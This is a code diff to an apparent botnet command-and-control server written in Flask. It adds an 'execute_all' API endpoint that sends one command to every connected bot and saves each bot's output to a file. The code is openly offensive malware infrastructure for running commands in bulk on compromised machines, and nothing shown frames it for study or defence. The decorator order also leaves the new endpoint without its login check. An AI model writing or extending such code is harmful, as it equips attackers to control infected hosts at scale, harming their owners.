@@ -1,8 +1,7 @@
-from flask import url_for, request, Blueprint, jsonify, render_template, redirect, flash, url_for
-from C2Server.threaded_server import getThreadNameAndIP, CMD_INPUT, CMD_OUTPUT
-from flask_login import current_user, login_required
+from flask import request, Blueprint, jsonify, render_template
+from C2Server.threaded_server import getThreadNameAndIP, CMD_INPUT, CMD_OUTPUT, THREADS, IPS
+from flask_login import login_required
 from C2Server import OUTPUT_DIR
-from time import sleep
 
 bots = Blueprint('bots', __name__)
 
@@ -38,6 +37,25 @@ def delete_bot(thread_uuid):
             with open(f"{OUTPUT_DIR}/{thread_uuid}.txt", "w") as f:
                 f.write(response)
             return jsonify({"success" : "Bot deleted successfully"}), 200
+        else:
+            raise Exception("Invalid request method")
+    except Exception as e:
+        return jsonify({"error" : str(e)}), 400
+    
+@login_required
+@bots.route("/api/execute_all", methods=["POST"])
+def execute_all():
+    try:
+        if request.method == "POST":
+            data = request.get_json()
+            command = data.get("command")
+            for thread_uuid in THREADS:
+                CMD_INPUT[thread_uuid].put(command)
+            for thread_uuid in THREADS:
+                response = CMD_OUTPUT[thread_uuid].get()
+                with open(f"{OUTPUT_DIR}/{thread_uuid}.txt", "w") as f:
+                    f.write(response)
+            return jsonify({"success" : "Command executed successfully"}), 200
         else:
             raise Exception("Invalid request method")
     except Exception as e:
